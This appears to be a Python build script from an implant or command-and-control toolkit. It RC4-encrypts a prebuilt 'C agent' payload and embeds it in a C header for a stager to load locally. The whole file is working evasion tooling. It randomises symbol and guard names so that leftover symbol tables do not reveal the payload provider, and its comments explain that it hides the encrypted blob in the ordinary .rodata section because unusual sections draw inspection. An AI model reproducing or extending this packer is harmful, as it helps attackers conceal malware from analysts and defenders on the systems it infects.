#!/usr/bin/env python3
"""Embed a prebuilt C agent PIC into the stager for local payload loading.

Usage: embed_payload.py <payload.pic> <local_payload.h>

The payload is RC4-encrypted with a fresh key, exactly like a listener-served
blob, so the stager still decrypts it only in the process that runs it.
"""

import os
import secrets
import sys

from pack_rc4 import rc4

MAX_PAYLOAD = 0xFFFFFFFF


def main():
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <payload.pic> <local_payload.h>", file=sys.stderr)
        return 2
    payload_path, out_path = sys.argv[1], sys.argv[2]
    payload = open(payload_path, "rb").read()
    if not payload:
        print(f"{payload_path}: empty payload", file=sys.stderr)
        return 1
    if len(payload) > MAX_PAYLOAD:
        print(f"{payload_path}: payload too large ({len(payload)} bytes)", file=sys.stderr)
        return 1

    key = os.urandom(16)
    enc = rc4(payload, key)

    # Per-build identifiers and section name: release artifacts are stripped,
    # but section headers and any residual symbol table must not name the
    # payload provider.
    suffix = secrets.token_hex(8)
    guard = "STAGER_LOCAL_" + secrets.token_hex(8).upper()
    key_sym = "k_" + suffix
    bin_sym = "b_" + suffix
    # A normal read-only section. Do not use a payload-specific or random
    # section name: unusual sections are an obvious inspection target.
    section = ".rodata"
    with open(out_path, "w") as out:
        out.write(f"#ifndef {guard}\n#define {guard}\n")
        out.write(f"#define STAGER_LOCAL_PAYLOAD_KEY {key_sym}\n")
        out.write(f"#define STAGER_LOCAL_PAYLOAD_BIN {bin_sym}\n")
        out.write(f"#define STAGER_LOCAL_PAYLOAD_LEN {len(payload)}u\n")
        out.write(
            f"static const unsigned char {key_sym}[16] "
            f'__attribute__((section("{section}"), used)) = {{ '
        )
        out.write(", ".join(hex(b) for b in key))
        out.write(" };\n")
        out.write(
            f"static const unsigned char {bin_sym}[] "
            f'__attribute__((section("{section}"), used)) = {{ '
        )
        out.write(", ".join(hex(b) for b in enc))
        out.write(f" }};\n#endif\n")
    print(f"embedded {len(payload)} byte payload in {out_path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
